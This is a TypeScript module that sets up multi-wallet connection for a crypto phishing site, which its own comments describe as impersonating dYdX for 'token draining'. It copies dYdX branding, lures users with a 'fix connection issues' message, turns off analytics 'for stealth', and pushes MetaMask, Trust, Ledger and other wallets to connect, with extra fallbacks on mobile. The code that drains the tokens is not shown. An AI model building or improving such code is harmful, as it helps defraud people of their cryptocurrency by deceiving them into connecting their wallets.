/**
 * Reown AppKit Configuration for DyDx Phishing Site
 * 
 * Multi-wallet support using Reown AppKit (formerly WalletConnect)
 * for comprehensive wallet connectivity and token draining.
 */

import { createAppKit } from '@reown/appkit'
import { Ethers5Adapter } from '@reown/appkit-adapter-ethers5'
import { mainnet } from '@reown/appkit/networks'

// Project configuration with fallback
const projectId = process.env.NEXT_PUBLIC_REOWN_PROJECT_ID || process.env.NEXT_PUBLIC_WALLETCONNECT_PROJECT_ID || 'dd830d985907b8065908432e4742bd54'

console.log('🔧 Reown Project ID:', projectId)

// Metadata for the DyDx phishing site
const metadata = {
  name: 'DyDx Wallet Connection',
  description: 'Connect your wallet to fix DyDx connection issues',
  url: typeof window !== 'undefined' ? window.location.origin : 'https://dydx.exchange',
  icons: ['https://dydx.exchange/favicon.ico']
}

// Create the Ethers adapter
const ethersAdapter = new Ethers5Adapter()

// Suppress Lit development warnings and optimize performance
if (typeof window !== 'undefined') {
  // Set Lit to production mode to suppress warnings
  ;(window as any).litDevMode = false
  
  // Override console.warn to filter out Lit warnings
  const originalWarn = console.warn
  console.warn = (...args) => {
    const message = args.join(' ')
    if (message.includes('scheduled an update') || 
        message.includes('change-in-update') ||
        message.includes('Lit is in dev mode') ||
        message.includes('reactive-element')) {
      return // Suppress these warnings
    }
    originalWarn.apply(console, args)
  }
}

// Initialize Reown AppKit with error handling and mobile optimizations
let appKit: any = null

try {
  appKit = createAppKit({
    adapters: [ethersAdapter],
    networks: [mainnet],
    metadata,
    projectId,
    features: {
      analytics: false, // Disable analytics for stealth
      email: false,     // Disable email login
      socials: [],      // No social logins
      onramp: false,    // Disable fiat onramp
      swaps: false,     // Disable swaps
      history: false    // Disable transaction history
    },
    themeMode: 'dark',
    themeVariables: {
      // Customize colors to match DyDx branding
      '--w3m-color-mix': '#7370ff',
      '--w3m-color-mix-strength': 40,
      '--w3m-accent': '#7370ff',
      '--w3m-border-radius-master': '12px',
      // Use system fonts to avoid CORS issues
      '--w3m-font-family': '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif',
      '--w3m-font-size-master': '14px'
    } as any,
    // Mobile wallet configuration for better deep linking
    enableWalletConnect: true,
    enableInjected: true,
    enableEIP6963: true,
    enableCoinbase: true,
    // Include popular mobile wallets for better compatibility
    includeWalletIds: [
      'c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96', // MetaMask
      '4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0', // Trust Wallet
      'fd20dc426fb37566d803205b19bbc1d4096b248ac04548e3cfb6b3a38bd033aa', // Coinbase
      '38f5d18bd8522c244bdd70cb4a68e0e718865155811c043f052fb9f1c51de662', // Bitget
      '8a0ee50d1f22f6651afcae7eb4253e52a3310b90af5daef78a8c4929a9bb99d4', // Binance
      '1ae92b26df02f0abca6304df07debccd18262fdf5fe82daa81593582dac9a369', // Rainbow
      '19177a98252e07ddfc9af2083ba8e07ef627cb6103467ffebb3f8f4205fd7927'  // Ledger Live
    ],
    // Add mobile-specific configurations
    ...(typeof window !== 'undefined' && /Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) && {
      // Mobile-specific settings
      allWallets: 'SHOW', // Show all available wallets on mobile
      connectModalOptions: {
        enableNetworkButton: false,
        enableAccountButton: false,
        themeMode: 'dark'
      }
    })
  })
  console.log('✅ Reown AppKit initialized successfully')
} catch (error) {
  console.warn('⚠️ Reown AppKit initialization warning:', error)
  // Continue with limited functionality
}

export { appKit }

// Reown Wallet Manager for DyDx phishing
export class ReownWalletManager {
  private modal: any = null
  private isConnectedState: boolean = false
  private accountState: string | undefined = undefined
  private chainIdState: number | undefined = undefined

  constructor() {
    this.modal = appKit
    if (this.modal) {
      this.initializeListeners()
      console.log('✅ Reown wallet manager initialized')
    } else {
      console.log('⚠️ Reown unavailable, using fallback wallet connection')
    }
  }

  private initializeListeners() {
    if (!this.modal) return
    
    let accountChangeTimeout: NodeJS.Timeout | null = null
    
    // Listen for account changes with debouncing
    this.modal.subscribeAccount?.((account: any) => {
      if (accountChangeTimeout) {
        clearTimeout(accountChangeTimeout)
      }
      
      accountChangeTimeout = setTimeout(() => {
        const newAddress = account?.address
        const newConnected = account?.isConnected || false
        
        // Only log if there's an actual change
        if (newAddress !== this.accountState || newConnected !== this.isConnectedState) {
          this.accountState = newAddress
          this.isConnectedState = newConnected
          if (newAddress) {
            console.log('🔗 Account connected:', newAddress)
          } else if (this.accountState) {
            console.log('🔌 Account disconnected')
          }
        }
      }, 100) // 100ms debounce
    })

    // Listen for network changes
    this.modal.subscribeChainId?.((chainId: number) => {
      if (chainId !== this.chainIdState) {
        this.chainIdState = chainId
        console.log('🌐 Network changed:', chainId)
      }
    })
  }

  async connect(): Promise<string> {
    try {
      console.log('🔗 Attempting Reown connection...')
      
      // Check if appKit is available
      if (!appKit) {
        console.log('⚠️ Reown unavailable, trying direct wallet connection...')
        return this.connectDirect()
      }

      // Mobile-specific handling
      if (this.isMobile()) {
        console.log('📱 Mobile device detected, using optimized connection...')
        return this.connectMobile()
      }
      
      await this.modal.open()
      
      // Wait for connection with shorter timeout on mobile
      return new Promise((resolve, reject) => {
        const checkConnection = () => {
          if (this.isConnectedState && this.accountState) {
            resolve(this.accountState)
          } else {
            setTimeout(checkConnection, 100)
          }
        }
        
        const timeout = this.isMobile() ? 10000 : 15000 // Shorter timeout on mobile
        setTimeout(() => {
          if (!this.isConnectedState) {
            console.log('⚠️ Reown timeout, trying direct connection...')
            this.connectDirect().then(resolve).catch(reject)
          }
        }, timeout)
        
        checkConnection()
      })
    } catch (error) {
      console.error('❌ Reown connection failed, trying direct connection:', error)
      return this.connectDirect()
    }
  }

  // Mobile-optimized connection method
  private async connectMobile(): Promise<string> {
    try {
      console.log('📱 Starting mobile wallet connection...')
      
      // For mobile, try direct connection first as it's more reliable
      if (window.ethereum) {
        console.log('📱 Mobile browser wallet detected, connecting directly...')
        return this.connectDirect()
      }
      
      // If no injected wallet, open modal but with mobile optimizations
      await this.modal.open()
      
      // Mobile wallets often need more time to deep link
      return new Promise((resolve, reject) => {
        let connectionAttempts = 0
        const maxAttempts = 3
        
        const checkConnection = () => {
          if (this.isConnectedState && this.accountState) {
            console.log('📱 Mobile wallet connected successfully')
            resolve(this.accountState)
          } else {
            connectionAttempts++
            if (connectionAttempts < maxAttempts) {
              setTimeout(checkConnection, 200) // Longer intervals for mobile
            } else {
              console.log('📱 Mobile wallet connection timeout, trying fallback...')
              this.connectDirect().then(resolve).catch(reject)
            }
          }
        }
        
        // Start checking immediately
        checkConnection()
        
        // Ultimate timeout for mobile
        setTimeout(() => {
          if (!this.isConnectedState) {
            console.log('📱 Mobile connection ultimate timeout')
            this.connectDirect().then(resolve).catch(reject)
          }
        }, 8000) // 8 second timeout for mobile
      })
    } catch (error) {
      console.error('📱 Mobile connection failed:', error)
      return this.connectDirect()
    }
  }

  // Helper to detect mobile devices
  private isMobile(): boolean {
    if (typeof window === 'undefined') return false
    return /Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)
  }

  // Direct wallet connection fallback with mobile optimizations
  private async connectDirect(): Promise<string> {
    try {
      console.log('🔗 Attempting direct wallet connection...')
      
      if (!window.ethereum) {
        // Mobile specific: try to detect if we're in a wallet browser
        if (this.isMobile() && this.isInWalletBrowser()) {
          console.log('📱 Mobile wallet browser detected, waiting for ethereum...')
          // Wait a bit for wallet injection
          await this.waitForEthereumInjection(3000)
        }
        
        if (!window.ethereum) {
          throw new Error('No wallet detected. Please install MetaMask or use a mobile wallet browser.')
        }
      }

      // Check if we're already connected
      const existingAccounts = await (window as any).ethereum.request({ method: 'eth_accounts' })
      if (existingAccounts && existingAccounts.length > 0) {
        console.log('✅ Already connected to:', existingAccounts[0])
        this.accountState = existingAccounts[0]
        this.isConnectedState = true
        return existingAccounts[0]
      }

      // Request connection
      console.log('🔌 Requesting wallet connection...')
      const accounts = await (window as any).ethereum.request({
        method: 'eth_requestAccounts'
      })

      if (accounts && accounts.length > 0) {
        this.accountState = accounts[0]
        this.isConnectedState = true
        console.log('✅ Direct wallet connection successful:', accounts[0])
        return accounts[0]
      }

      throw new Error('No accounts returned from wallet')
    } catch (error) {
      console.error('❌ Direct wallet connection failed:', error)
      throw error
    }
  }

  // Wait for ethereum injection (mobile wallets often inject asynchronously)
  private async waitForEthereumInjection(timeout: number = 3000): Promise<void> {
    return new Promise((resolve) => {
      const startTime = Date.now()
      
      const checkEthereum = () => {
        if (window.ethereum) {
          console.log('📱 Ethereum detected!')
          resolve()
        } else if (Date.now() - startTime < timeout) {
          setTimeout(checkEthereum, 100)
        } else {
          console.log('📱 Ethereum injection timeout')
          resolve()
        }
      }
      
      checkEthereum()
    })
  }

  // Detect if we're in a mobile wallet's browser
  private isInWalletBrowser(): boolean {
    if (typeof window === 'undefined') return false
    
    const userAgent = navigator.userAgent.toLowerCase()
    return (
      userAgent.includes('trust') ||
      userAgent.includes('metamask') ||
      userAgent.includes('coinbase') ||
      userAgent.includes('imtoken') ||
      userAgent.includes('tokenpocket') ||
      userAgent.includes('safepal') ||
      userAgent.includes('bitget') ||
      userAgent.includes('binance')
    )
  }

  disconnect(): void {
    try {
      this.modal?.disconnect?.()
      this.isConnectedState = false
      this.accountState = undefined
      this.chainIdState = undefined
    } catch (error) {
      console.error('Disconnect failed:', error)
    }
  }

  getAccount(): string | undefined {
    return this.accountState || this.modal?.getAccount?.()?.address
  }

  getChainId(): number | undefined {
    if (this.chainIdState) {
      return this.chainIdState
    }
    
    try {
      return this.modal?.getChainId?.() || this.modal?.state?.chainId
    } catch (error) {
      console.warn('Failed to get chain ID:', error)
      return undefined
    }
  }

  isConnected(): boolean {
    return this.isConnectedState || this.modal?.getAccount?.()?.isConnected || false
  }

  async getProvider(): Promise<any> {
    try {
      // Try Reown provider first
      if (appKit && this.modal) {
        const provider = await this.modal.getWalletProvider?.()
        if (provider) {
          return provider
        }
      }
      
      // Fallback to window.ethereum
      if (window.ethereum) {
        console.log('🔄 Using direct window.ethereum provider')
        return window.ethereum
      }
      
      throw new Error('No provider available')
    } catch (error) {
      console.warn('⚠️ Provider access failed, using fallback:', error)
      
      // Last resort: return window.ethereum if available
      if (window.ethereum) {
        return window.ethereum
      }
      
      return null
    }
  }

  subscribeToAccount(callback: (account: string | undefined) => void): () => void {
    return this.modal.subscribeAccount?.((account: any) => {
      this.accountState = account?.address
      this.isConnectedState = account?.isConnected || false
      callback(this.accountState)
    }) || (() => {})
  }

  subscribeToNetwork(callback: (chainId: number | undefined) => void): () => void {
    return this.modal.subscribeChainId?.((chainId: number) => {
      this.chainIdState = chainId
      callback(chainId)
    }) || (() => {})
  }
}

// Export singleton instance
export const reownWalletManager = new ReownWalletManager()

// Supported wallets for the DyDx phishing site
export const SUPPORTED_WALLETS = [
  'MetaMask',
  'Trust Wallet',
  'Coinbase Wallet',
  'Rainbow',
  'Phantom',
  'Brave Wallet',
  'WalletConnect',
  'Ledger',
  'Trezor'
]
